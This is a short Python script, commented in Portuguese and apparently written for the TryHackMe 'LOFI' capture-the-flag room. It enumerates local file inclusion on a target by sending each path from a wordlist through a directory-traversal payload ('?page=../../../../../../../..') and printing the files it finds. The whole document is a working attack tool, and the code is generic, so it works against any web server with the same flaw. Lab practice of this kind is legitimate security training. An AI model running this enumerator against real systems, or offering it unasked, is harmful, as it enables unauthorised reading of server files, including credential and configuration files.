#!usr/bin/python3
# Enumerador de LFI feito por GusBTC para a room LOFI do Try Hack Me

import requests

alvo = input('Target IP >>> ')
wordlist = input('Wordlist >>> ')

try:
	with open (wordlist, "r") as lfi:
		for i in lfi.readlines():
			i = i.replace("\n", "")
			link = f'http://{alvo}/?page=../../../../../../../..{i}'
			req = requests.get(link)	

			if 'not exist' in req.text:
				pass
				#print(f'{i} invalido')
			else:
				print(f'{i} FOUND')
except KeyboardInterrupt:
	print('Leaving...')
